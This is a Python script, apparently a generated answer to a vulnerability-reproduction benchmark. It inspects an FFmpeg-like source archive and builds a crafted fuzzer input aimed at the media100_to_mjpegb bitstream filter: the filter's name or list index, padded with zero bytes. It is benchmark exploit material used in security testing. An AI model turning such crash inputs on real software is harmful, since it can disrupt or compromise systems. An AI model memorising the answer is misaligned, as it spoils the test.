import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        with tarfile.open(src_path, "r:*") as tf:
            fuzzer_code = self._find_bsf_fuzzer_code(tf)
            uses_name = (
                fuzzer_code is not None
                and "av_bsf_get_by_name" in fuzzer_code
                and "av_bsf_iterate" not in fuzzer_code
            )

            if uses_name:
                header = b"media100_to_mjpegb\x00\x00"
                payload_len = max(1, 1025 - len(header))
                payload = b"\x00" * payload_len
                return header + payload

            idx = self._extract_bsf_index(tf)
            if idx is None:
                idx = 0
            header = idx.to_bytes(4, "little", signed=False)
            payload_len = max(1, 1025 - len(header))
            payload = b"\x00" * payload_len
            return header + payload

    def _find_bsf_fuzzer_code(self, tf: tarfile.TarFile):
        for member in tf.getmembers():
            if not member.isfile():
                continue
            name_lower = member.name.lower()
            if not (
                name_lower.endswith(".c")
                or name_lower.endswith(".cc")
                or name_lower.endswith(".cpp")
            ):
                continue
            if member.size > 200000:
                continue
            f = tf.extractfile(member)
            if f is None:
                continue
            data = f.read()
            if b"LLVMFuzzerTestOneInput" not in data:
                continue
            text = data.decode("utf-8", errors="ignore")
            lower = text.lower()
            if ("av_bsf" in text or "avbsf" in lower or "avbitstreamfilter" in lower) and (
                "bsf" in lower
            ):
                return text
        return None

    def _extract_bsf_index(self, tf: tarfile.TarFile):
        target_symbol = "media100_to_mjpegb"
        array_pattern = re.compile(
            r"(?:ff_bsf_list|bitstream_filters)\s*\[\s*\]\s*=\s*{([^}]+)};",
            re.S,
        )
        entry_pattern = re.compile(r"&ff_([A-Za-z0-9_]+)_bsf")

        for member in tf.getmembers():
            if not member.isfile():
                continue
            name_lower = member.name.lower()
            if not name_lower.endswith(".c"):
                continue
            if "libavcodec" not in name_lower:
                continue
            f = tf.extractfile(member)
            if f is None:
                continue
            data = f.read()
            text = data.decode("utf-8", errors="ignore")
            if "media100_to_mjpegb_bsf" not in text:
                continue
            m = array_pattern.search(text)
            if not m:
                continue
            body = m.group(1)
            entries = entry_pattern.findall(body)
            if not entries:
                continue
            try:
                idx = entries.index(target_symbol)
                return idx
            except ValueError:
                continue
        return None